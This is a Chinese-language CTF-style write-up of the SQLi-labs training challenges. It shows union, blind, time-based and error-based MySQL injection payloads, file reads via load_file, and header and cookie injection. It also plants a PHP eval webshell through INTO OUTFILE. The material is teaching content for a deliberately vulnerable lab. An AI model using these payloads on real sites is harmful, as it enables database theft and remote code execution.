---
title: SQLi-labs Basic Challenges
tags:
  - SQLi
  - Writeup
  - CTF
date: 2019-04-25 20:54:00
---
![](/assets/images/move/1549198143185-cba3a637-7d3e-4215-a1e7-662142310b4f.png)

## Error based

![](/assets/images/move/1549200569009-2d90d538-099a-4fbd-8a0b-2f4cc5e5d50f.png)

下面以 **Less 1 GET-Error based-Single quotes-String** 为例分析:

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

`id=1'` 返回

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```


`id=1' or 1=1 --+` 正常返回结果。

`id = 1' ORDER BY 3 --+` 正常返回结果。

`id = 1' ORDER BY 4 --+` 返回`Unknown column '4' in 'order clause'`， 判断 `user`表存在3列数据。

- 爆数据库

`id = -1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+`

```sql
SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--+' LIMIT 0,1
```

![](/assets/images/move/1549195342935-7b56b398-2e05-4524-a2d3-62bdd69a6f90.png)

- 爆(security)数据表

`id=-1' union select 1,group_concat(table_name),3 from information_schema.tables WHERE table_schema='security' --+`

```sql
SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security' --+' LIMIT 0,1
```

![](/assets/images/move/1549195726863-9927dde1-73e7-40e8-8949-232995945cdc.png)

- 爆(users)列

`id=id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE  table_schema = 'security' AND table_name='users' --+`

```sql
SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE  table_schema = 'security' AND table_name='users' --+` LIMIT 0,1
```

![](/assets/images/move/1549196119537-bec64921-7bfc-479f-8292-10520cb8e005.png)


- 爆数据

`id=-1' UNION SELECT id,username,password FROM users WHERE id = 3 --+`

```sql
SELECT * FROM users WhERE id = '-1' UNION SELECT id,username,password FROM  users WHERE id = 3 --+` LIMIT 0,1
```

![](/assets/images/move/1549196396683-3511de3a-b925-414d-9f2e-135eed456e00.png)


## Double Injection

```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

`id=1' or 1=1 --+`回显`You are in...........`。


### 布尔盲注

**1.猜数据库名**

利用`left(version(),1)`进行尝试，`id=1' AND left(version(), 1)=5 --+`回显正常。

 - `length(database())`查看数据库名长度，`id=1' AND length(database())=8--+`回显正常。

 - `left(database(),1) > 'a'`猜测数据库名，`id=1' AND left(database(),1) > 'a' --+`回显正常。

--> `security`。

**2.获取数据库下的表**

利用**substr()**、**ascii()** 函数进行尝试。

```sql
ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1), 1, 1)) = 101 #email
```

```sql
ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1),1,1))>80 #二分法
```

第一个表应为`email`，获取第二个表`refers`(LIMIT 1,1)。

```sql
ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1,1),1,1))>113--+ 
```

**3.获取表中的列**

利用`regexp`获取`user`表中的列。

```sql
# 测试表中是否包含 username 的列
1 = (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name regexp '^username' limit 0,1)--+
```

同理可判断`username`、`password`等列是否存在。

**4.获取表中的内容**

```sql
#获取user表中username列的第一条记录的第一个字符的ascii与68(D)进行比较 --> Dumb
ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
```

### 报错盲注

```sql
UNION SELECT 1,count(*),concat(0x3a, 0x3a, (SELECT user()),0x3a,0x3a,floor(rand(0)*2))a FROM information_schema.columns GROUP BY a--+
```

![](/assets/images/move/1549204477936-e36325ca-df26-4a82-a86e-bb38f6a66f99.png)

---

 - [BIGINT Overflow Error Based SQL Injection](https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/)
 - [Error Based SQL Injection Using EXP](https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/)

---


利用double数值类型超出范围进行报错注入:

```sql
UNION SELECT (exp(~(SELECT * FROM (SELECT user())a))),2,3 --+
```

![](/assets/images/move/1549204704344-e27ead96-e984-40ea-8e07-748e75ac5d91.png)


利用bigint溢出进行报错注入：

```sql
UNION SELECT (!(SELECT * FROM (SELECT user())x) - ~0),2,4 --+
```

![](/assets/images/move/1549205141215-9fb46d96-672c-45cc-977c-d30cd38910ae.png)


利用xpath函数报错注入：

```sql
# mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误 
AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --+
AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1) --+
```

![](/assets/images/move/1549205345651-77b286e1-921d-4506-9dd2-31cca35f41ef.png)

利用数据的重复性报错注入:

```sql
# mysql 重复特性，此处重复了 version，所以报错。
UNION SELECT 1,2,3 FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x --+
```

![](/assets/images/move/1549205633106-9eee82e3-f21c-4bb6-8f91-354fcbe0746d.png)

### 延时注入


- 利用sleep()函数进行注入：

```sql
# 当有错误时会有5s的时间延时
AND if(ascii(substr(database(),1,1)) = 115, 1, sleep(5)) --+
```

- 利用 benchmark()进行延时注入：

```sql
# 结果正确时候将运行encode('MSG', 'by 5 seconds')操作50000000次，会占用一段时间
UNION SELECT (if(substring(current, 1, 1) = CHAR(115), benchmark(50000000, encode('MSG', 'by 5 seconds')), null)),2,3 FROM (SELECT database() as current) as tb1--+
```
- 常见的延时注入方式

|数据库类型|延时注入方式|
|:---:|:-----:|
|MySQL|BENCHMARK(100000, MD5(1)) / SLEEP(5)|
|PostgreSQL|PG_SLEEP(5) / GENERATE_SERIES(1, 10000)|
|Mssql Server| WAITFOR DELAY '0:0:5'|

### Less 5 Double Injection

> eg: **Less 5 GET-Double Injection-Single Quotes-String**

`id=1'`回显`near ''1'' LIMIT 0,1'`，表明为`'`闭合。

- 查看数据库版本号

`?id=1' and left(version(), 1)=5--+`, 回显**You are in...........**，错误则回显空内容。

- 查看数据库长度

`?id=1' and length(database())=8--+`，数据库长度为**8**。

- 猜数据库名

```sql
# 这里可以使用二分法
?id=1' and left(database(), 1)='s'--+ --> s
?id=1' and left(database(), 2)>'sa'--+ --> You are in
?id=1' and left(database(), 2)='se'--+ --> se
# 依次类推
?id=1' and left(database(), 8) = 'security'--+ --> security 
```

- 获取security下的数据表

```sql
# 利用函数substr()、ascii()进行尝试
ascii(substr(select table_name from information_schema.tables where tables_schema=database() limit 0,1), 1, 1))=101 -> e
# 获取表的第二位
substr(table_name, 2, 1)
# 依次类推
table1_name = email
# 获取第二张表
limit 2,1
# 依次类推
table2_name = referers
```

- 获取user表中的列

**RegExp** 正则匹配:[参考链接](https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001434499503920bb7b42ff6627420da2ceae4babf6c4f2000)

```sql
# 判断user表中是否含有名为username的列
and 1 = (select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+
# 依次类推
username, password
```

- 获取user表中的内容

```SQL
# 利用函数ord()、mid()进行尝试
ORD(MID(SELECT IFNULL(CAST(username AS CHAR), 0X20) FROM security.users ORDER BY id limit 0,1),1,1))=68--+ --> D
# 以此类推
Dump
```

Less 6 替换 `'` 为 `"` 即可。

### Less 9 Blind Time-based

```sql
# Payload
# 猜测数据库
# 正确时直接返回，不正确时等待5秒
AND IF(ascii(substr(database(),1,1))=115,1,sleep(5))--+ -->s
# security
# 猜数据表
AND IF(ascii(substr(SELECT table_name FROM information_schema.tables WHERE table_shema='security' LIMIT 0,1))=101,1,sleep(5))--+
# emails, referers, uagents, users
# 猜Columns
AND IF(ascii(substr(SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 0,1)1,1)=1,1,sleep(5))--+
# id, username, password
# 猜字段
AND IF(ascii(substr((SELECT username FROM users LIMIT 0,1),1,1))=68,1,sleep(5))--+
```

Less 10 替换`'`为`"`即可。

## 导入导出

### load_file()导出文件

**load_file()**:读取文件并返回文件内容为字符串。

|使用条件|验证方式|
|-------|-------|
|A.拥有file权限| and (select count(*) from mysql.user()>0/*返回正常|
|B.文件必须位于服务器主机上||
|C.必须指定完整路径的文件|MySQL注入load_file常用路径|
|D.文件所有字节可读且文件内容必须小于max_allowed_packet||

如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。

实际注入中的难点：**绝对的物理路径**、**构造有效的畸形语句通过报错爆出绝对路径**。

> 参考：[MySQL注入load_file常用路径](https://www.cnblogs.com/lcamry/p/5729087.html)

```sql
# 示例
select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))
# Explain: 利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用。
select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))
# Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码
select 1,1,1,load_file(0x633a2f626f6f742e696e69)
# Explain：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”
select 1,1,1,load_file(c:\\boot.ini)
# Explain:路径里的/用 \\代替
```

### 文件导入到数据库

```sql
# The LOAD DATA statement reads rows from a text file into a table at a very high speed. 
LOAD DATA INFILE 'data.txt' INTO TABLE db2.my_table;
# eg: 将/tmp/t0.txt导入到表t0中，字符集设置为gbk，每项数据间的分隔符设置为\t，每行的结尾符设置为\n
LOAD DATA INFILE '/tmp/t0.txt' IGNORE INTO TABLE t0 CHARACTER SET gbk FIELDS TERMINATED BY '\t' LINES TERMINATED BY '\n'
# 错误代码为2时：文件不存在。
# 错误代码为13时： 没有权限，可以考虑/tmp等文件夹。
```

### 导入到文件


```sql
# Writes the selected rows to a file.
SELECT.....INTO OUTFILE 'file_name'
```	



两种利用形式:

- 直接导入文件



```sql
SELECT <?php @eval($_POST('mima'))?> INTO OUFILE "C:\\phpnow\\htdocs\\test.php"
```



- 修改文件结尾



> 参考：[sqlmap os shell解析](http://www.cnblogs.com/lcamry/p/5505110.html)

```sql
# 通常是用'\r\n'结尾，此处我们修改为自己想要的任何文件。0x16可以是一句话或其他任意文件。
SELECT versions() INTO outfile "c:\\phpnow\\htdocs\\test.php" LINES TERMINATED BY 0x16
# Tips
# 1.文件路径可能需要转义，具体看环境。
# 2.当前台无法导出数据的时候，可以尝试如下语句导出得到数据。
SELECT load_file('c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini') INTO outfile 'c:\\wamp\\www\\test.php'
# my.ini 当中存在 password 项（不过默认被注释）。
```

### Less 7 Dump into outfile

- 判断闭合方式

`id=1'`回显：near **'**'1'')) LIMIT 0,1 **'** at line 1, 判断闭合方式为`(('$id'))`。

- 测试columns

`ORDER BY 4`回显`You have an error in your SQL syntaxUnknown column '4' in 'order clause'`， 数据列数为3。

- 导入一句话木马

```sql
# @@global.secure_file_priv /var/lib/mysql-files/
UNION SELECT 1,2,'<?php @eval($_POST["code"])?>' INTO outfile "/var/www/sqli_lab/sqli-labs-php7/Less-7/shell.php" --+
```



## 增删改函数介绍

```sql
# INSERT 增加记录
# 单条
INSERT INTO <表名> (字段1, 字段2, ...) VALUES (值1, 值2, ...);
# 多条
INSERT INTO students (class_id, name, gender, score) VALUES
  (1, '大宝', 'M', 87),
  (2, '二宝', 'M', 81);

# UPDATE 修改记录
UPDATE <表名> SET 字段1=值1, 字段2=值2, ... WHERE ...;

#DELETE 删除记录
DELETE FROM <表名> WHERE ...;
```

### Less 17 Update Query-Error Based

`uname=admin&passwd=1'&submit=Submit`发包后得到回显:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1

```sql
SELECT username, password FROM users WHERE username= $uname LIMIT 0,1
```

判断注入点位于`passwd`，闭合方式为`'`。

尝试`xpath`报错注入：

```sql
# 爆库
uname=admin&passwd=1' or updatexml(1,concat(0x7e,database(),0x7e),1)#&submit=Submit
# 回显: XPATH syntax error: '~security~'

# 爆数据表
uname=admin&passwd=' or updatexml(1, concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)#&submit=Submit
# 回显：XPATH syntax error: '~emails,referers,uagents,users~'

# 爆列
uname=admin&passwd=' or updatexml(1, concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' limit 3,1),0x7e),1)#&submit=Submit
# 回显: XPATH syntax error: '~id~' 
# 3 id 4 username 5 password

# 爆数据
uname=admin&passwd=' or updatexml(1,concat(0x7e,(select username from users),0x7e),1)#&submit=Submit
# 回显：You can't specify target table 'users' for update in FROM clause
uname=admin&passwd=' or updatexml(1,concat(0x7e,(select username from (select username from users)b limit 0,1),0x7e),1)#&submit=Submit
# 回显：XPATH syntax error: '~Dumb~'

```

通过查看代码我们发现:`$uname=check_input($_POST['uname']);`。

```php
function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,15);
		}

		// Stripslashes if magic quotes enabled
		if (get_magic_quotes_gpc())
			{
			$value = stripslashes($value);
			}

		// Quote if not a number
		if (!ctype_digit($value))
			{
			$value = "'" . mysql_real_escape_string($value) . "'";
			}
		
	else
		{
		$value = intval($value);
		}
	return $value;
  }
  ```

## HTTP Injection

### Less 18 Uagent field / Error based

username:admin,password:1;登录成功后显示`IP`(**REMOTE_ADDR**方式获取，不易伪造)以及`User Agent`信息, **User-Agent**字段存在注入点。

```sql
# Payload
User-Agent: ' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
# 回显
XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'
```

### Less 19 Referer field / Error based

```sql
# code
$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
# payload
' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1
# 回显
XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'
```

### Less 20 Cookie Injection / Uagent field

![](/assets/images/move/1551451323683-caaadf24-eec8-4d9d-bb7f-37084ed27a8f.png)

Cookie: `uname = admin' and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#`。

![](/assets/images/move/1551451651325-788dfe81-f2f3-4d76-8a73-74401ed905d7.png)


Less 21 、Less 22 `cookie`进行了base64 encode, 分别为单引号和双引号闭合，注入姿势相同~

> 参考: 《MySQL注入天书》

